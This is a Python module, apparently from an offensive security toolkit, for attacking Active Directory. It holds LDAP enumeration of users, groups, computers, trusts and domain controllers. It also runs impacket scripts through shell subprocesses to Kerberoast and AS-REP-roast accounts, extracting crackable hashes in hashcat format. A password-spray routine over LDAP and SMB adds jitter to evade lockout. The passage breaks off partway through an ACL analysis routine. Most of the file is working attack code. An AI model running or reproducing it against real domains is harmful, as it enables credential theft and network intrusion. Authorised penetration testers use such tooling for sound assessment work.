"""AUTARCH Active Directory Audit

LDAP enumeration, Kerberoasting, AS-REP roasting, ACL analysis,
BloodHound collection, and password spray for AD security assessment.
"""

import os
import sys
import json
import time
import subprocess
import struct
import random
import threading
from pathlib import Path
from datetime import datetime, timedelta

# Module metadata
DESCRIPTION = "Active Directory enumeration & attack"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

# Path setup
try:
    from core.paths import get_data_dir
except ImportError:
    def get_data_dir():
        return Path(__file__).parent.parent / 'data'

sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from core.banner import Colors, clear_screen, display_banner
except ImportError:
    class Colors:
        CYAN = YELLOW = GREEN = RED = BOLD = DIM = RESET = WHITE = MAGENTA = ""
    def clear_screen(): pass
    def display_banner(): pass

# Optional dependency flags
try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, ALL_ATTRIBUTES
    from ldap3.core.exceptions import LDAPException
    HAS_LDAP3 = True
except ImportError:
    HAS_LDAP3 = False

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1 as ldapasn1
    HAS_IMPACKET_LDAP = True
except ImportError:
    HAS_IMPACKET_LDAP = False

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants as krb5_constants
    from impacket.krb5.types import Principal, KerberosTime
    HAS_IMPACKET_KRB = True
except ImportError:
    HAS_IMPACKET_KRB = False

# AD timestamp epoch: Jan 1, 1601
AD_EPOCH = datetime(1601, 1, 1)

# User Account Control flags
UAC_FLAGS = {
    0x0001: 'SCRIPT',
    0x0002: 'ACCOUNTDISABLE',
    0x0008: 'HOMEDIR_REQUIRED',
    0x0010: 'LOCKOUT',
    0x0020: 'PASSWD_NOTREQD',
    0x0040: 'PASSWD_CANT_CHANGE',
    0x0080: 'ENCRYPTED_TEXT_PWD_ALLOWED',
    0x0100: 'TEMP_DUPLICATE_ACCOUNT',
    0x0200: 'NORMAL_ACCOUNT',
    0x0800: 'INTERDOMAIN_TRUST_ACCOUNT',
    0x1000: 'WORKSTATION_TRUST_ACCOUNT',
    0x2000: 'SERVER_TRUST_ACCOUNT',
    0x10000: 'DONT_EXPIRE_PASSWORD',
    0x20000: 'MPC_LOGON_ACCOUNT',
    0x40000: 'SMARTCARD_REQUIRED',
    0x80000: 'TRUSTED_FOR_DELEGATION',
    0x100000: 'NOT_DELEGATED',
    0x200000: 'USE_DES_KEY_ONLY',
    0x400000: 'DONT_REQUIRE_PREAUTH',
    0x800000: 'PASSWORD_EXPIRED',
    0x1000000: 'TRUSTED_TO_AUTH_FOR_DELEGATION',
    0x4000000: 'PARTIAL_SECRETS_ACCOUNT',
}

# Dangerous ACE rights
DANGEROUS_RIGHTS = {
    'GenericAll': 'Full control over the object',
    'GenericWrite': 'Modify all attributes of the object',
    'WriteOwner': 'Change the owner of the object',
    'WriteDACL': 'Modify the DACL of the object',
    'Self': 'Self-membership — can add self to group',
    'ForceChangePassword': 'Reset the password without knowing current',
    'WriteProperty-Member': 'Can modify group membership',
    'WriteProperty-Script-Path': 'Can modify logon script path',
    'ExtendedRight-User-Force-Change-Password': 'Force password reset',
    'ExtendedRight-DS-Replication-Get-Changes': 'DCSync — replicate directory changes',
    'ExtendedRight-DS-Replication-Get-Changes-All': 'DCSync — replicate all changes including secrets',
}

# Well-known SIDs
WELL_KNOWN_SIDS = {
    'S-1-5-32-544': 'BUILTIN\\Administrators',
    'S-1-5-32-545': 'BUILTIN\\Users',
    'S-1-5-32-548': 'BUILTIN\\Account Operators',
    'S-1-5-32-549': 'BUILTIN\\Server Operators',
    'S-1-5-32-550': 'BUILTIN\\Print Operators',
    'S-1-5-32-551': 'BUILTIN\\Backup Operators',
}


def _ad_timestamp_to_str(ts):
    """Convert AD timestamp (100-nanosecond intervals since 1601) to readable string."""
    if not ts or ts == 0 or ts == '0':
        return 'Never'
    try:
        ts = int(ts)
        if ts <= 0 or ts > 2650467743990000000:
            return 'Never'
        seconds = ts / 10_000_000
        dt = AD_EPOCH + timedelta(seconds=seconds)
        return dt.strftime('%Y-%m-%d %H:%M:%S')
    except (ValueError, OverflowError, OSError):
        return 'Unknown'


def _parse_uac(uac_value):
    """Parse userAccountControl into list of flag names."""
    try:
        uac = int(uac_value)
    except (ValueError, TypeError):
        return []
    flags = []
    for bit, name in UAC_FLAGS.items():
        if uac & bit:
            flags.append(name)
    return flags


def _get_domain_dn(domain):
    """Convert domain name to LDAP DN. e.g. corp.local -> DC=corp,DC=local"""
    return ','.join(f'DC={part}' for part in domain.split('.'))


class ADToolkit:
    """Active Directory enumeration and attack toolkit."""

    def __init__(self):
        self.conn = None
        self.server = None
        self.dc_host = None
        self.domain = None
        self.domain_dn = None
        self.username = None
        self.password = None
        self.use_ssl = False
        self.connected = False

        # Results storage
        self.results = {
            'users': [],
            'groups': [],
            'computers': [],
            'ous': [],
            'gpos': [],
            'trusts': [],
            'dcs': [],
            'spn_accounts': [],
            'asrep_accounts': [],
            'admin_accounts': [],
            'kerberoast_hashes': [],
            'asrep_hashes': [],
            'spray_results': [],
            'acl_findings': [],
            'unconstrained_delegation': [],
            'constrained_delegation': [],
            'bloodhound': {},
        }

        # Data directory
        self.data_dir = Path(str(get_data_dir())) / 'ad_audit'
        self.data_dir.mkdir(parents=True, exist_ok=True)

    def print_status(self, message, status='info'):
        colors = {'info': Colors.CYAN, 'success': Colors.GREEN,
                  'warning': Colors.YELLOW, 'error': Colors.RED}
        symbols = {'info': '*', 'success': '+', 'warning': '!', 'error': 'X'}
        print(f"{colors.get(status, Colors.WHITE)}[{symbols.get(status, '*')}] {message}{Colors.RESET}")

    def _run_cmd(self, cmd, timeout=120):
        """Run a shell command and return (success, stdout)."""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout
            )
            return result.returncode == 0, result.stdout.strip()
        except subprocess.TimeoutExpired:
            return False, 'Command timed out'
        except Exception as e:
            return False, str(e)

    def _save_results(self, name, data):
        """Save results to JSON in data/ad_audit/."""
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        path = self.data_dir / f'{name}_{ts}.json'
        with open(path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        return str(path)

    # ========== CONNECTION ==========

    def connect(self, dc_host, domain, username=None, password=None, use_ssl=False):
        """Establish LDAP connection to a Domain Controller.

        Tries ldap3 first, falls back to impacket if available.
        Returns dict with success status and message.
        """
        self.dc_host = dc_host
        self.domain = domain
        self.domain_dn = _get_domain_dn(domain)
        self.username = username
        self.password = password
        self.use_ssl = use_ssl

        port = 636 if use_ssl else 389
        scheme = 'ldaps' if use_ssl else 'ldap'

        if HAS_LDAP3:
            try:
                use_tls = use_ssl
                self.server = Server(
                    dc_host, port=port, use_ssl=use_tls,
                    get_info=ALL, connect_timeout=10
                )
                if username and password:
                    user_dn = f'{domain}\\{username}'
                    self.conn = Connection(
                        self.server, user=user_dn, password=password,
                        authentication=NTLM, auto_bind=True
                    )
                else:
                    # Anonymous bind
                    self.conn = Connection(self.server, auto_bind=True)

                self.connected = True
                info_str = ''
                if self.server.info:
                    naming = getattr(self.server.info, 'other', {})
                    if hasattr(self.server.info, 'naming_contexts'):
                        info_str = f' | Naming contexts: {len(self.server.info.naming_contexts)}'
                return {
                    'success': True,
                    'message': f'Connected to {dc_host}:{port} via ldap3{info_str}',
                    'backend': 'ldap3'
                }
            except Exception as e:
                self.connected = False
                return {'success': False, 'message': f'ldap3 connection failed: {str(e)}'}

        elif HAS_IMPACKET_LDAP:
            try:
                ldap_url = f'{scheme}://{dc_host}'
                self.conn = impacket_ldap.LDAPConnection(ldap_url, self.domain_dn)
                if username and password:
                    self.conn.login(username, password, domain)
                self.connected = True
                return {
                    'success': True,
                    'message': f'Connected to {dc_host}:{port} via impacket',
                    'backend': 'impacket'
                }
            except Exception as e:
                self.connected = False
                return {'success': False, 'message': f'impacket LDAP failed: {str(e)}'}
        else:
            return {
                'success': False,
                'message': 'No LDAP library available. Install ldap3 (pip install ldap3) or impacket.'
            }

    def disconnect(self):
        """Close the LDAP connection."""
        if self.conn and HAS_LDAP3:
            try:
                self.conn.unbind()
            except Exception:
                pass
        self.conn = None
        self.server = None
        self.connected = False
        return {'success': True, 'message': 'Disconnected'}

    def is_connected(self):
        """Check if currently connected to a DC."""
        return self.connected and self.conn is not None

    def get_connection_info(self):
        """Return current connection details."""
        return {
            'connected': self.is_connected(),
            'dc_host': self.dc_host,
            'domain': self.domain,
            'domain_dn': self.domain_dn,
            'username': self.username,
            'use_ssl': self.use_ssl,
            'backend': 'ldap3' if HAS_LDAP3 else ('impacket' if HAS_IMPACKET_LDAP else None),
            'libs': {
                'ldap3': HAS_LDAP3,
                'impacket_ldap': HAS_IMPACKET_LDAP,
                'impacket_krb': HAS_IMPACKET_KRB,
            }
        }

    # ========== LDAP SEARCH HELPER ==========

    def _ldap_search(self, search_base=None, search_filter='(objectClass=*)',
                     attributes=None, size_limit=0):
        """Perform LDAP search and return list of entry dicts."""
        if not self.is_connected() or not HAS_LDAP3:
            return []

        if search_base is None:
            search_base = self.domain_dn

        if attributes is None:
            attributes = ALL_ATTRIBUTES

        try:
            self.conn.search(
                search_base=search_base,
                search_filter=search_filter,
                search_scope=SUBTREE,
                attributes=attributes,
                size_limit=size_limit
            )
            entries = []
            for entry in self.conn.entries:
                d = {'dn': str(entry.entry_dn)}
                for attr in entry.entry_attributes:
                    val = entry[attr].value
                    if isinstance(val, list):
                        d[str(attr)] = [str(v) for v in val]
                    elif isinstance(val, bytes):
                        d[str(attr)] = val.hex()
                    elif isinstance(val, datetime):
                        d[str(attr)] = val.strftime('%Y-%m-%d %H:%M:%S')
                    else:
                        d[str(attr)] = str(val) if val is not None else None
                entries.append(d)
            return entries
        except Exception as e:
            self.print_status(f'LDAP search error: {e}', 'error')
            return []

    # ========== ENUMERATION ==========

    def enumerate_users(self, search_filter=None):
        """Enumerate all domain user accounts with key attributes."""
        if not self.is_connected():
            return {'error': 'Not connected', 'users': []}

        ldap_filter = search_filter or '(&(objectCategory=person)(objectClass=user))'
        attrs = [
            'sAMAccountName', 'displayName', 'distinguishedName',
            'memberOf', 'lastLogon', 'lastLogonTimestamp', 'pwdLastSet',
            'userAccountControl', 'description', 'mail',
            'adminCount', 'servicePrincipalName', 'whenCreated'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        users = []
        for entry in raw_entries:
            uac = int(entry.get('userAccountControl', 0) or 0)
            uac_flags = _parse_uac(uac)
            last_logon_raw = entry.get('lastLogon') or entry.get('lastLogonTimestamp') or '0'
            user = {
                'username': entry.get('sAMAccountName', ''),
                'display_name': entry.get('displayName', ''),
                'dn': entry.get('dn', ''),
                'description': entry.get('description', ''),
                'mail': entry.get('mail', ''),
                'member_of': entry.get('memberOf', []) if isinstance(entry.get('memberOf'), list) else ([entry.get('memberOf')] if entry.get('memberOf') else []),
                'last_logon': _ad_timestamp_to_str(last_logon_raw),
                'pwd_last_set': _ad_timestamp_to_str(entry.get('pwdLastSet', '0')),
                'uac_value': uac,
                'uac_flags': uac_flags,
                'enabled': 'ACCOUNTDISABLE' not in uac_flags,
                'admin_count': entry.get('adminCount', '0') == '1',
                'spn': entry.get('servicePrincipalName', []) if isinstance(entry.get('servicePrincipalName'), list) else ([entry.get('servicePrincipalName')] if entry.get('servicePrincipalName') else []),
                'dont_require_preauth': bool(uac & 0x400000),
                'password_never_expires': bool(uac & 0x10000),
                'when_created': entry.get('whenCreated', ''),
            }
            users.append(user)

        self.results['users'] = users
        self._save_results('users', users)
        return {'users': users, 'count': len(users)}

    def enumerate_groups(self, search_filter=None):
        """Enumerate all domain groups with their members."""
        if not self.is_connected():
            return {'error': 'Not connected', 'groups': []}

        ldap_filter = search_filter or '(objectCategory=group)'
        attrs = [
            'sAMAccountName', 'distinguishedName', 'description',
            'member', 'groupType', 'adminCount', 'whenCreated'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        groups = []
        for entry in raw_entries:
            members = entry.get('member', [])
            if isinstance(members, str):
                members = [members]
            elif members is None:
                members = []

            group_type = int(entry.get('groupType', 0) or 0)
            scope = 'Unknown'
            if group_type & 0x00000002:
                scope = 'Global'
            elif group_type & 0x00000004:
                scope = 'Domain Local'
            elif group_type & 0x00000008:
                scope = 'Universal'
            if group_type & 0x80000000:
                scope += ' (Security)'
            else:
                scope += ' (Distribution)'

            groups.append({
                'name': entry.get('sAMAccountName', ''),
                'dn': entry.get('dn', ''),
                'description': entry.get('description', ''),
                'members': members,
                'member_count': len(members),
                'scope': scope,
                'admin_count': entry.get('adminCount', '0') == '1',
                'when_created': entry.get('whenCreated', ''),
            })

        self.results['groups'] = groups
        self._save_results('groups', groups)
        return {'groups': groups, 'count': len(groups)}

    def enumerate_computers(self):
        """Enumerate domain computers with OS information."""
        if not self.is_connected():
            return {'error': 'Not connected', 'computers': []}

        ldap_filter = '(objectCategory=computer)'
        attrs = [
            'sAMAccountName', 'dNSHostName', 'distinguishedName',
            'operatingSystem', 'operatingSystemVersion',
            'operatingSystemServicePack', 'lastLogonTimestamp',
            'userAccountControl', 'whenCreated', 'description',
            'msDS-AllowedToDelegateTo'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        computers = []
        for entry in raw_entries:
            uac = int(entry.get('userAccountControl', 0) or 0)
            uac_flags = _parse_uac(uac)
            delegate_to = entry.get('msDS-AllowedToDelegateTo', [])
            if isinstance(delegate_to, str):
                delegate_to = [delegate_to]
            elif delegate_to is None:
                delegate_to = []

            computers.append({
                'name': entry.get('sAMAccountName', '').rstrip('$'),
                'dns_name': entry.get('dNSHostName', ''),
                'dn': entry.get('dn', ''),
                'os': entry.get('operatingSystem', ''),
                'os_version': entry.get('operatingSystemVersion', ''),
                'os_sp': entry.get('operatingSystemServicePack', ''),
                'last_logon': _ad_timestamp_to_str(entry.get('lastLogonTimestamp', '0')),
                'enabled': 'ACCOUNTDISABLE' not in uac_flags,
                'trusted_for_delegation': bool(uac & 0x80000),
                'constrained_delegation': delegate_to,
                'description': entry.get('description', ''),
                'when_created': entry.get('whenCreated', ''),
            })

        self.results['computers'] = computers
        self._save_results('computers', computers)
        return {'computers': computers, 'count': len(computers)}

    def enumerate_ous(self):
        """Enumerate organizational units."""
        if not self.is_connected():
            return {'error': 'Not connected', 'ous': []}

        ldap_filter = '(objectCategory=organizationalUnit)'
        attrs = ['name', 'distinguishedName', 'description', 'whenCreated', 'gPLink']

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        ous = []
        for entry in raw_entries:
            gp_link = entry.get('gPLink', '')
            linked_gpos = []
            if gp_link:
                # Parse gpLink format: [LDAP://cn={GUID},cn=policies,...;0]
                import re
                linked_gpos = re.findall(r'\[LDAP://([^\]]+)\]', str(gp_link), re.IGNORECASE)

            ous.append({
                'name': entry.get('name', ''),
                'dn': entry.get('dn', ''),
                'description': entry.get('description', ''),
                'linked_gpos': linked_gpos,
                'when_created': entry.get('whenCreated', ''),
            })

        self.results['ous'] = ous
        self._save_results('ous', ous)
        return {'ous': ous, 'count': len(ous)}

    def enumerate_gpos(self):
        """Enumerate Group Policy Objects."""
        if not self.is_connected():
            return {'error': 'Not connected', 'gpos': []}

        ldap_filter = '(objectCategory=groupPolicyContainer)'
        attrs = [
            'displayName', 'distinguishedName', 'gPCFileSysPath',
            'versionNumber', 'whenCreated', 'whenChanged', 'flags'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        gpos = []
        for entry in raw_entries:
            flags = int(entry.get('flags', 0) or 0)
            status = 'Enabled'
            if flags & 1:
                status = 'User config disabled'
            if flags & 2:
                status = 'Computer config disabled'
            if flags == 3:
                status = 'All settings disabled'

            gpos.append({
                'name': entry.get('displayName', ''),
                'dn': entry.get('dn', ''),
                'path': entry.get('gPCFileSysPath', ''),
                'version': entry.get('versionNumber', ''),
                'status': status,
                'when_created': entry.get('whenCreated', ''),
                'when_changed': entry.get('whenChanged', ''),
            })

        self.results['gpos'] = gpos
        self._save_results('gpos', gpos)
        return {'gpos': gpos, 'count': len(gpos)}

    def enumerate_trusts(self):
        """Enumerate domain trusts."""
        if not self.is_connected():
            return {'error': 'Not connected', 'trusts': []}

        ldap_filter = '(objectClass=trustedDomain)'
        attrs = [
            'name', 'distinguishedName', 'trustDirection',
            'trustType', 'trustAttributes', 'flatName',
            'trustPartner', 'whenCreated'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        trusts = []
        for entry in raw_entries:
            direction_val = int(entry.get('trustDirection', 0) or 0)
            direction_map = {0: 'Disabled', 1: 'Inbound', 2: 'Outbound', 3: 'Bidirectional'}
            direction = direction_map.get(direction_val, f'Unknown ({direction_val})')

            trust_type_val = int(entry.get('trustType', 0) or 0)
            type_map = {1: 'Windows NT', 2: 'Active Directory', 3: 'MIT Kerberos', 4: 'DCE'}
            trust_type = type_map.get(trust_type_val, f'Unknown ({trust_type_val})')

            attrs_val = int(entry.get('trustAttributes', 0) or 0)
            trust_attrs = []
            if attrs_val & 1:
                trust_attrs.append('Non-Transitive')
            if attrs_val & 2:
                trust_attrs.append('Uplevel Only')
            if attrs_val & 4:
                trust_attrs.append('Quarantined / SID Filtering')
            if attrs_val & 8:
                trust_attrs.append('Forest Trust')
            if attrs_val & 16:
                trust_attrs.append('Cross-Organization')
            if attrs_val & 32:
                trust_attrs.append('Within Forest')
            if attrs_val & 64:
                trust_attrs.append('Treat As External')

            trusts.append({
                'name': entry.get('name', ''),
                'partner': entry.get('trustPartner', ''),
                'flat_name': entry.get('flatName', ''),
                'direction': direction,
                'type': trust_type,
                'attributes': trust_attrs,
                'dn': entry.get('dn', ''),
                'when_created': entry.get('whenCreated', ''),
            })

        self.results['trusts'] = trusts
        self._save_results('trusts', trusts)
        return {'trusts': trusts, 'count': len(trusts)}

    def find_dcs(self):
        """Locate domain controllers and FSMO role holders."""
        if not self.is_connected():
            return {'error': 'Not connected', 'dcs': []}

        # Find DCs by userAccountControl SERVER_TRUST_ACCOUNT flag
        ldap_filter = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
        attrs = [
            'sAMAccountName', 'dNSHostName', 'distinguishedName',
            'operatingSystem', 'operatingSystemVersion', 'whenCreated'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        dcs = []
        for entry in raw_entries:
            dcs.append({
                'name': entry.get('sAMAccountName', '').rstrip('$'),
                'dns_name': entry.get('dNSHostName', ''),
                'dn': entry.get('dn', ''),
                'os': entry.get('operatingSystem', ''),
                'os_version': entry.get('operatingSystemVersion', ''),
                'when_created': entry.get('whenCreated', ''),
            })

        # Try to find FSMO role holders from RootDSE
        fsmo_roles = {}
        if HAS_LDAP3 and self.server and self.server.info:
            info = self.server.info
            other = getattr(info, 'other', {})
            for role_attr in ['schemaMaster', 'domainNamingMaster',
                              'ridMaster', 'pdcEmulator', 'infrastructureMaster']:
                if role_attr in other:
                    fsmo_roles[role_attr] = str(other[role_attr])

        # Also check via LDAP if server.info didn't have it
        if not fsmo_roles:
            # Schema Master
            schema_entries = self._ldap_search(
                search_base=f'CN=Schema,CN=Configuration,{self.domain_dn}',
                search_filter='(objectClass=dMD)',
                attributes=['fSMORoleOwner']
            )
            if schema_entries:
                fsmo_roles['schemaMaster'] = schema_entries[0].get('fSMORoleOwner', '')

            # Domain Naming Master
            partitions = self._ldap_search(
                search_base=f'CN=Partitions,CN=Configuration,{self.domain_dn}',
                search_filter='(objectClass=crossRefContainer)',
                attributes=['fSMORoleOwner']
            )
            if partitions:
                fsmo_roles['domainNamingMaster'] = partitions[0].get('fSMORoleOwner', '')

            # RID Master, PDC Emulator, Infrastructure Master
            domain_entries = self._ldap_search(
                search_base=self.domain_dn,
                search_filter='(objectClass=domainDNS)',
                attributes=['fSMORoleOwner']
            )
            if domain_entries:
                fsmo_roles['pdcEmulator'] = domain_entries[0].get('fSMORoleOwner', '')

        result = {
            'dcs': dcs,
            'count': len(dcs),
            'fsmo_roles': fsmo_roles
        }
        self.results['dcs'] = dcs
        self._save_results('dcs', result)
        return result

    # ========== ATTACK METHODS ==========

    def find_spn_accounts(self):
        """Find user accounts with SPNs set (Kerberoastable)."""
        if not self.is_connected():
            return {'error': 'Not connected', 'accounts': []}

        ldap_filter = '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(objectCategory=computer))(!(sAMAccountName=krbtgt)))'
        attrs = [
            'sAMAccountName', 'servicePrincipalName', 'memberOf',
            'pwdLastSet', 'userAccountControl', 'adminCount',
            'distinguishedName', 'description'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        accounts = []
        for entry in raw_entries:
            spns = entry.get('servicePrincipalName', [])
            if isinstance(spns, str):
                spns = [spns]
            elif spns is None:
                spns = []

            uac = int(entry.get('userAccountControl', 0) or 0)
            accounts.append({
                'username': entry.get('sAMAccountName', ''),
                'spns': spns,
                'dn': entry.get('dn', ''),
                'description': entry.get('description', ''),
                'pwd_last_set': _ad_timestamp_to_str(entry.get('pwdLastSet', '0')),
                'admin_count': entry.get('adminCount', '0') == '1',
                'enabled': not bool(uac & 0x0002),
                'member_of': entry.get('memberOf', []) if isinstance(entry.get('memberOf'), list) else ([entry.get('memberOf')] if entry.get('memberOf') else []),
            })

        self.results['spn_accounts'] = accounts
        return {'accounts': accounts, 'count': len(accounts)}

    def find_asrep_accounts(self):
        """Find accounts that do not require Kerberos pre-authentication."""
        if not self.is_connected():
            return {'error': 'Not connected', 'accounts': []}

        # UF_DONT_REQUIRE_PREAUTH = 0x400000
        ldap_filter = '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
        attrs = [
            'sAMAccountName', 'distinguishedName', 'memberOf',
            'pwdLastSet', 'userAccountControl', 'description'
        ]

        raw_entries = self._ldap_search(search_filter=ldap_filter, attributes=attrs)
        accounts = []
        for entry in raw_entries:
            accounts.append({
                'username': entry.get('sAMAccountName', ''),
                'dn': entry.get('dn', ''),
                'description': entry.get('description', ''),
                'pwd_last_set': _ad_timestamp_to_str(entry.get('pwdLastSet', '0')),
                'member_of': entry.get('memberOf', []) if isinstance(entry.get('memberOf'), list) else ([entry.get('memberOf')] if entry.get('memberOf') else []),
            })

        self.results['asrep_accounts'] = accounts
        return {'accounts': accounts, 'count': len(accounts)}

    def kerberoast(self, dc_host, domain, username, password):
        """Request TGS tickets for SPN accounts and extract hashes.

        Uses impacket's GetUserSPNs.py via subprocess, falling back to
        manual TGS-REQ if impacket scripts are not available on PATH.
        Returns hashes in hashcat ($krb5tgs$23$*) format.
        """
        hashes = []

        # Try GetUserSPNs.py from impacket
        cmd = (
            f'GetUserSPNs.py {domain}/{username}:{password} '
            f'-dc-ip {dc_host} -request -outputfile -'
        )
        success, output = self._run_cmd(cmd, timeout=60)
        if success and output:
            for line in output.splitlines():
                line = line.strip()
                if line.startswith('$krb5tgs$'):
                    hashes.append(line)

        # Also try python -m form
        if not hashes:
            cmd2 = (
                f'python -m impacket.examples.GetUserSPNs '
                f'{domain}/{username}:{password} '
                f'-dc-ip {dc_host} -request -outputfile -'
            )
            success2, output2 = self._run_cmd(cmd2, timeout=60)
            if success2 and output2:
                for line in output2.splitlines():
                    line = line.strip()
                    if line.startswith('$krb5tgs$'):
                        hashes.append(line)

        # Also try impacket-GetUserSPNs (newer naming)
        if not hashes:
            cmd3 = (
                f'impacket-GetUserSPNs {domain}/{username}:{password} '
                f'-dc-ip {dc_host} -request'
            )
            success3, output3 = self._run_cmd(cmd3, timeout=60)
            if success3 and output3:
                for line in output3.splitlines():
                    line = line.strip()
                    if line.startswith('$krb5tgs$'):
                        hashes.append(line)

        if not hashes:
            # Fallback: enumerate SPNs and note that impacket is needed
            spn_result = self.find_spn_accounts()
            spn_count = spn_result.get('count', 0)
            if spn_count > 0:
                return {
                    'hashes': [],
                    'count': 0,
                    'spn_accounts': spn_count,
                    'message': (
                        f'Found {spn_count} SPN accounts but could not extract TGS hashes. '
                        'Install impacket: pip install impacket'
                    )
                }
            return {
                'hashes': [],
                'count': 0,
                'spn_accounts': 0,
                'message': 'No SPN accounts found or impacket not available'
            }

        self.results['kerberoast_hashes'] = hashes
        self._save_results('kerberoast_hashes', hashes)
        return {
            'hashes': hashes,
            'count': len(hashes),
            'spn_accounts': len(hashes),
            'message': f'Extracted {len(hashes)} TGS hash(es) in hashcat format'
        }

    def asrep_roast(self, dc_host, domain, userlist=None):
        """Find accounts without pre-auth and extract AS-REP hashes.

        Uses impacket's GetNPUsers.py via subprocess.
        """
        hashes = []

        if userlist:
            # Write userlist to temp file
            tmp_file = self.data_dir / 'asrep_users.txt'
            with open(tmp_file, 'w') as f:
                for u in userlist:
                    f.write(u.strip() + '\n')
            user_arg = f'-usersfile {tmp_file}'
        else:
            user_arg = ''

        # Try GetNPUsers.py
        for cmd_prefix in [
            'GetNPUsers.py',
            'python -m impacket.examples.GetNPUsers',
            'impacket-GetNPUsers'
        ]:
            cmd = f'{cmd_prefix} {domain}/ -dc-ip {dc_host} {user_arg} -format hashcat -outputfile -'
            success, output = self._run_cmd(cmd, timeout=60)
            if success and output:
                for line in output.splitlines():
                    line = line.strip()
                    if line.startswith('$krb5asrep$'):
                        hashes.append(line)
                if hashes:
                    break

        if not hashes:
            # Enumerate AS-REP vulnerable accounts via LDAP
            asrep_result = self.find_asrep_accounts()
            vuln_count = asrep_result.get('count', 0)
            return {
                'hashes': [],
                'count': 0,
                'vulnerable_accounts': vuln_count,
                'accounts': asrep_result.get('accounts', []),
                'message': (
                    f'Found {vuln_count} accounts without pre-auth but '
                    'could not extract AS-REP hashes. Install impacket.'
                ) if vuln_count > 0 else 'No accounts without pre-authentication found'
            }

        self.results['asrep_hashes'] = hashes
        self._save_results('asrep_hashes', hashes)
        return {
            'hashes': hashes,
            'count': len(hashes),
            'vulnerable_accounts': len(hashes),
            'message': f'Extracted {len(hashes)} AS-REP hash(es) in hashcat format'
        }

    def password_spray(self, userlist, password, dc_host, domain, protocol='ldap'):
        """Spray a single password against a list of users.

        Implements delay and jitter between attempts to avoid account lockout.
        Supports LDAP and SMB protocols.
        """
        if not userlist or not password:
            return {'error': 'User list and password required', 'results': []}

        results = []
        successes = []
        failures = []
        lockouts = []
        delay_base = 1.0
        jitter = 0.5

        for i, user in enumerate(userlist):
            user = user.strip()
            if not user:
                continue

            entry = {'username': user, 'status': 'unknown', 'message': ''}

            if protocol == 'ldap':
                try:
                    port = 636 if self.use_ssl else 389
                    test_server = Server(dc_host, port=port, use_ssl=self.use_ssl,
                                         connect_timeout=5) if HAS_LDAP3 else None
                    if test_server:
                        test_conn = Connection(
                            test_server,
                            user=f'{domain}\\{user}',
                            password=password,
                            authentication=NTLM,
                            auto_bind=True
                        )
                        test_conn.unbind()
                        entry['status'] = 'success'
                        entry['message'] = 'Authentication successful'
                        successes.append(user)
                    else:
                        entry['status'] = 'error'
                        entry['message'] = 'ldap3 not available'
                except Exception as e:
                    err_msg = str(e).lower()
                    if 'locked' in err_msg or '775' in err_msg:
                        entry['status'] = 'lockout'
                        entry['message'] = 'Account locked out'
                        lockouts.append(user)
                    elif 'credential' in err_msg or 'invalid' in err_msg or '52e' in err_msg:
                        entry['status'] = 'failed'
                        entry['message'] = 'Invalid credentials'
                        failures.append(user)
                    elif 'disabled' in err_msg or '533' in err_msg:
                        entry['status'] = 'disabled'
                        entry['message'] = 'Account disabled'
                        failures.append(user)
                    elif 'expired' in err_msg or '532' in err_msg:
                        entry['status'] = 'expired'
                        entry['message'] = 'Password expired'
                        failures.append(user)
                    else:
                        entry['status'] = 'failed'
                        entry['message'] = str(e)[:100]
                        failures.append(user)

            elif protocol == 'smb':
                # Use smbclient or impacket's smbconnection
                cmd = f'smbclient -L //{dc_host} -U {domain}\\\\{user}%{password} -c quit 2>&1'
                success, output = self._run_cmd(cmd, timeout=10)
                if success or 'Sharename' in output:
                    entry['status'] = 'success'
                    entry['message'] = 'SMB authentication successful'
                    successes.append(user)
                elif 'LOCKED' in output.upper() or 'locked' in output.lower():
                    entry['status'] = 'lockout'
                    entry['message'] = 'Account locked out'
                    lockouts.append(user)
                else:
                    entry['status'] = 'failed'
                    entry['message'] = 'Authentication failed'
                    failures.append(user)

            results.append(entry)

            # Delay between attempts with jitter
            if i < len(userlist) - 1:
                wait = delay_base + random.uniform(0, jitter)
                time.sleep(wait)

            # Stop if too many lockouts
            if len(lockouts) >= 3:
                remaining = [u.strip() for u in userlist[i+1:] if u.strip()]
                for u in remaining:
                    results.append({
                        'username': u,
                        'status': 'skipped',
                        'message': 'Skipped — too many lockouts detected'
                    })
                break

        spray_result = {
            'results': results,
            'total': len(results),
            'successes': successes,
            'success_count': len(successes),
            'failure_count': len(failures),
            'lockout_count': len(lockouts),
            'password_tested': password,
            'protocol': protocol,
        }
        self.results['spray_results'] = spray_result
        self._save_results('password_spray', spray_result)
        return spray_result

    def analyze_acls(self, target_dn=None):
        """Find dangerous ACL entries: GenericAll, WriteDACL, WriteOwner, etc."""
        if not self.is_connected():
            return {'error': 'Not connected', 'findings': []}

        search_base = target_dn or self.domain_dn
        # Search for objects with ntSecurityDescriptor
        ldap_filter = '(objectClass=*)'
        attrs = ['distinguishedName', 'nTSecurityDescriptor', 'objectClass', 'sAMAccountName']

        # We need to request the SD control for ntSecurityDescriptor
        findings = []

        # Search high-value targets: users, groups, OUs, domain root
        targets = [
            ('(&(objectCategory=group)(adminCount=1))', 'Admin Group'),
            ('(&(objectCategory=person)(adminCount=1))', 'Admin User'),
            ('(objectCategory=organizationalUnit)', 'OU'),
